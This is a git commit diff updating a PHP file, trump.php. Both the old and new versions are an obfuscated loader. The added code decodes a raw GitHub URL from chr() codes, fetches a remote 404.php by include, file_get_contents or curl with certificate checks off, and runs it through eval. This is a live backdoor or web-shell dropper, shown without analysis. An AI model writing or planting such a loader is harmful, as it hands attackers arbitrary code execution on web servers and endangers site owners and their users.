56de56d0b08f021b5dd12a388ab4b6129e53db83
b3l13v3x666 <me.b3l13v3@gmail.com>
2026-01-05 20:27:35 +0700

    Update trump.php

--- trump.php
+++ trump.php
@@ -1,33 +1,24 @@
 <?php
-$a=chr(105).chr(110).chr(105).chr(95).chr(103).chr(101).chr(116);
-$b=$a.chr(40).chr(39).chr(97).chr(108).chr(108).chr(111).chr(119).chr(95).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(99).chr(108).chr(117).chr(100).chr(101).chr(39).chr(41);
+$u = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).
+     chr(114).chr(97).chr(119).chr(46).chr(103).chr(105).chr(116).chr(104).chr(117).
+     chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).
+     chr(101).chr(110).chr(116).chr(46).chr(99).chr(111).chr(109).chr(47).
+     chr(98).chr(51).chr(108).chr(49).chr(51).chr(118).chr(51).chr(120).chr(54).
+     chr(54).chr(54).chr(47).chr(98).chr(108).chr(101).chr(115).chr(115).chr(101).
+     chr(100).chr(47).chr(114).chr(101).chr(102).chr(115).chr(47).chr(104).chr(101).
+     chr(97).chr(100).chr(115).chr(47).chr(109).chr(97).chr(105).chr(110).chr(47).
+     chr(52).chr(48).chr(52).chr(46).chr(112).chr(104).chr(112);
 
-$c=chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).
-   chr(114).chr(97).chr(119).chr(46).chr(103).chr(105).chr(116).chr(104).chr(117).
-   chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).
-   chr(101).chr(110).chr(116).chr(46).chr(99).chr(111).chr(109).chr(47).
-   chr(98).chr(51).chr(108).chr(49).chr(51).chr(118).chr(51).chr(120).chr(54).
-   chr(54).chr(54).chr(47).chr(98).chr(108).chr(101).chr(115).chr(115).chr(101).
-   chr(100).chr(47).chr(114).chr(101).chr(102).chr(115).chr(47).chr(104).chr(101).
-   chr(97).chr(100).chr(115).chr(47).chr(109).chr(97).chr(105).chr(110).chr(47).
-   chr(52).chr(48).chr(52).chr(46).chr(112).chr(104).chr(112);
-
-if(@ini_get($b)){
-    @include($c);
+if(ini_get('allow_url_include')){
+    include($u);
 }else{
-    $d=@file_get_contents($c);
-    if(empty($d)){
-        $e=chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116);
-        $f=$e($c);
-        $g=chr(67).chr(85).chr(82).chr(76).chr(79).chr(80).chr(84).chr(95);
-        curl_setopt($f, constant($g.'RETURNTRANSFER'), 1);
-        curl_setopt($f, constant($g.'SSL_VERIFYPEER'), 0);
-        $d=curl_exec($f);
-        curl_close($f);
+    $c=@file_get_contents($u);
+    if(!$c){
+        $ch=curl_init($u);
+        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>0]);
+        $c=curl_exec($ch);
+        curl_close($ch);
     }
-    if($d){
-        $h=chr(101).chr(118).chr(97).chr(108);
-        $h('?>'.$d);
-    }
+    eval('?>'.$c);
 }
 ?>
